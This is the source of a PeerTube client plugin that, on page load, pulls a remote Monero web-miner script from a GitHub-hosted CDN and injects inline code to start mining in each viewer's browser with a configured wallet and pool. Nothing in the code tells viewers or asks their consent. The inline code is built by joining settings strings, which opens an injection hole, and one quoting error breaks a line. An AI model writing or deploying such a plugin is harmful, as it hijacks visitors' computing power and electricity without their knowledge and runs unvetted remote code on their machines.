async function register({ registerHook, peertubeHelpers }) {
  peertubeHelpers.getSettings().then((s) => {

    // Peertubeのプラグインは末尾にセミコロン「；」は要らない
    console.log("Initializing Monero miner client plugin...")

    if (!s || !s["walletAddress"] || !s["poolAddress"]) {
      console.error("Monero miner plugin: Required settings are missing.")
      return
    }

    // 外部スクリプトをロード
    new Promise((resolve, reject) => {
      const externalScript = document.createElement("script")
      externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
      externalScript.defer = true // 実行タイミング調整
      externalScript.onload = () => {
        console.log("Mining script loaded successfully.")
        resolve()
      }
      externalScript.onerror = () => {
        console.error("Failed to load the mining script.")
        reject()
      }
      document.head.appendChild(externalScript)
    })
      .then(() => {
        // 外部スクリプトロード後に内部スクリプトを挿入
        const inlineScript = document.createElement("script")
        inlineScript.innerHTML += "server = '" + s["webSocket"] + "';\n"
        inlineScript.innerHTML += "var pool = '" + s["poolAddress"] + "';\n"
        inlineScript.innerHTML += "var walletAddress = '" + s["walletAddress"] + "';\n"
        inlineScript.innerHTML += "var workerId = 'PeerTube-Miner';\n"
        inlineScript.innerHTML += "var threads = '" + s["threads"] + "';\n"
        inlineScript.innerHTML += "var password = '" + s["password"] + ";'\n"
        inlineScript.innerHTML += "startMining(pool, walletAddress, workerId, threads, password);\n"
        inlineScript.innerHTML += "throttleMiner = 20;\n"
        document.body.appendChild(inlineScript)
        console.log("Mining started.")
      })
      .catch(() => {
        console.error("Error occurred during script injection.")
      })
  })
}

export { register }